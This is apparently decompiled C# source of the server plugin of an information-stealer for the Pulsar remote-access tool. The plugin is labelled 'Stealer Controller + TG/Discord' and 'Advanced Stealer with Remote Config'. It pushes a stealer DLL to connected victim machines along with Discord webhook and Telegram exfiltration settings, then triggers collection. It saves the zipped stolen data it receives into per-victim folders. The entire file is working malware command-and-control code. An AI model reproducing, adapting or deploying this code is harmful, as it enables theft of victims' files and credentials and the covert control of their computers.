// Decompiled with JetBrains decompiler
// Type: Pulsar.Plugins.Server.ArchiveCollectorServer
// Assembly: Stealer.Server, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: D55D4852-5F7A-42EA-B9D3-2DEEE645AD6A
// Assembly location: C:\Users\Administrator\Downloads\Pulsar Premium v2.4.5\Plugins\Stealer.Server.dll

using Pulsar.Server.Messages;
using Pulsar.Server.Networking;
using Pulsar.Server.Plugins;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

#nullable enable
namespace Pulsar.Plugins.Server;

public sealed class ArchiveCollectorServer : IServerPlugin, IDisposable
{
  private string _pluginDirectory = string.Empty;
  private IServerContext _context;
  private string _configFilePath = string.Empty;
  private Form? _logWindow;
  private TextBox? _logTextBox;
  private const string PLUGIN_ID_KEY = "stealer_plugin";

  public string Name => "Stealer Controller + TG/Discord";

  public Version Version => new Version(2, 0, 0);

  public string Author => "@aesxor";

  public string Description => "Advanced Stealer with Remote Config";

  public string Type => "Plugin";

  public bool AutoLoadToClients => false;

  public void Initialize(IServerContext context)
  {
    this._context = context;
    this._pluginDirectory = Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location) ?? AppDomain.CurrentDomain.BaseDirectory;
    this._configFilePath = Path.Combine(this._pluginDirectory, "stealer_server_config.txt");
    this.LogToAll("Stealer Server Plugin Initializing...");
    context.AddClientContextMenuItem(new string[1]
    {
      "⚡Xorium"
    }, "⚡ Run Stealer", new Action<IReadOnlyList<Client>>(this.OnCollectClicked));
    context.AddClientContextMenuItem(new string[1]
    {
      "⚡Xorium"
    }, "⚙ Settings", new Action<IReadOnlyList<Client>>(this.OnSettingsClicked));
    UniversalPluginResponseHandler.RegisterType("stealer_plugin", new Action<PluginResponse>(this.OnPluginResponse));
    this.LogToAll("Handler registered for key: stealer_plugin");
  }

  private void OnSettingsClicked(IReadOnlyList<Client> clients)
  {
    try
    {
      string webhook = "";
      string token = "";
      string chatId = "";
      if (File.Exists(this._configFilePath))
      {
        string[] strArray = File.ReadAllLines(this._configFilePath);
        if (strArray.Length != 0)
          webhook = strArray[0];
        if (strArray.Length > 1)
          token = strArray[1];
        if (strArray.Length > 2)
          chatId = strArray[2];
      }
      using (SettingsForm settingsForm = new SettingsForm(webhook, token, chatId))
      {
        if (settingsForm.ShowDialog() != DialogResult.OK)
          return;
        File.WriteAllLines(this._configFilePath, new string[3]
        {
          settingsForm.WebhookUrl,
          settingsForm.TgToken,
          settingsForm.TgChatId
        });
        int num = (int) MessageBox.Show("Config saved successfully!", "Stealer Server", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
      }
    }
    catch (Exception ex)
    {
      int num = (int) MessageBox.Show("Error opening settings: " + ex.Message);
    }
  }

  private async void OnCollectClicked(IReadOnlyList<Client> clients)
  {
    ArchiveCollectorServer archiveCollectorServer = this;
    archiveCollectorServer.EnsureLogWindow();
    if (clients.Count == 0)
      return;
    string str1 = "";
    if (File.Exists(archiveCollectorServer._configFilePath))
    {
      string[] strArray = File.ReadAllLines(archiveCollectorServer._configFilePath);
      string str2 = strArray.Length != 0 ? strArray[0].Trim() : "";
      string str3 = strArray.Length > 1 ? strArray[1].Trim() : "";
      string str4 = strArray.Length > 2 ? strArray[2].Trim() : "";
      str1 = $"{str2}|{str3}|{str4}";
      archiveCollectorServer.LogToAll($"Loaded config to send: [Webhook: {(string.IsNullOrEmpty(str2) ? "No" : "Yes")}, Telegram: {(string.IsNullOrEmpty(str3) ? "No" : "Yes")}]");
    }
    else
      archiveCollectorServer.LogToAll("Warning: Config file not found. Sending empty config.");
    try
    {
      string str5 = Path.Combine(archiveCollectorServer._pluginDirectory, "Stealer.Client.dll");
      if (!File.Exists(str5))
      {
        archiveCollectorServer.LogToAll("!!! Stealer.Client.dll not found in plugin directory!");
      }
      else
      {
        byte[] assemblyBytes = File.ReadAllBytes(str5);
        byte[] initBytes = Encoding.UTF8.GetBytes(str1);
        foreach (Client client1 in (IEnumerable<Client>) clients)
        {
          Client client = client1;
          if (!Client.op_Equality(client, (Client) null))
          {
            archiveCollectorServer.LogToAll($"Sending Stealer to {client}...");
            PushSender.LoadUniversalPlugin(client, "stealer_plugin", assemblyBytes, initBytes, "Pulsar.Plugins.Client.Stealer", "Initialize");
            await Task.Delay(1500);
            PushSender.ExecuteUniversalCommand(client, "stealer_plugin", "collect", Array.Empty<byte>());
            client = (Client) null;
          }
        }
        assemblyBytes = (byte[]) null;
        initBytes = (byte[]) null;
      }
    }
    catch (Exception ex)
    {
      archiveCollectorServer.LogToAll("Critical Error: " + ex.Message);
    }
  }

  private void OnPluginResponse(PluginResponse response)
  {
    string str1 = this.SanitizeFileName(response.Client?.ToString());
    try
    {
      if (response.Success && response.Data != null)
      {
        byte[] data = response.Data;
        string input = response.Message;
        if (string.IsNullOrEmpty(input))
          input = $"{str1}_{DateTime.Now:yyyyMMdd_HHmmss}.zip";
        string str2 = this.SanitizeFileName(input);
        if (!str2.EndsWith(".zip"))
          str2 += ".zip";
        string str3 = Path.Combine(this._pluginDirectory, "clientfolder", str1);
        Directory.CreateDirectory(str3);
        string str4 = Path.Combine(str3, str2);
        File.WriteAllBytes(str4, data);
        this.LogToAll($"[+] SUCCESS: Received {str2} ({data.Length} bytes) from {str1}");
        this.LogToAll("Saved to: " + str4);
      }
      else
        this.LogToAll($"[-] FAILED from {str1}: {response.Message}");
    }
    catch (Exception ex)
    {
      this.LogToAll("Error processing response: " + ex.Message);
    }
  }

  public void Dispose()
  {
    UniversalPluginResponseHandler.UnregisterType("stealer_plugin", new Action<PluginResponse>(this.OnPluginResponse));
    this._logWindow?.Close();
  }

  private void LogToAll(string message)
  {
    this._context.Log(message);
    this.LogToWindow(message);
  }

  private void EnsureLogWindow()
  {
    if (this._logWindow == null || this._logWindow.IsDisposed)
    {
      Form form = new Form();
      form.Text = "Stealer Logs & Status";
      form.Width = 700;
      form.Height = 500;
      form.StartPosition = FormStartPosition.CenterScreen;
      form.Icon = SystemIcons.Application;
      this._logWindow = form;
      TextBox textBox = new TextBox();
      textBox.Dock = DockStyle.Fill;
      textBox.Multiline = true;
      textBox.ReadOnly = true;
      textBox.ScrollBars = ScrollBars.Vertical;
      textBox.Font = new Font("Consolas", 10f);
      textBox.BackColor = Color.FromArgb(30, 30, 30);
      textBox.ForeColor = Color.LimeGreen;
      this._logTextBox = textBox;
      this._logWindow.Controls.Add((Control) this._logTextBox);
      this._logWindow.Show();
    }
    else
      this._logWindow.Activate();
  }

  private void LogToWindow(string message)
  {
    if (this._logWindow == null || this._logTextBox == null || this._logWindow.IsDisposed)
      return;
    string text = $"[{DateTime.Now:HH:mm:ss}] {message}\r\n";
    if (this._logTextBox.InvokeRequired)
      this._logTextBox.Invoke((Delegate) new Action<string>(this.LogToWindow), (object) message);
    else
      this._logTextBox.AppendText(text);
  }

  private string SanitizeFileName(string? input)
  {
    if (string.IsNullOrEmpty(input))
      return "unknown";
    foreach (char invalidFileNameChar in Path.GetInvalidFileNameChars())
      input = input.Replace(invalidFileNameChar, '_');
    return input;
  }
}
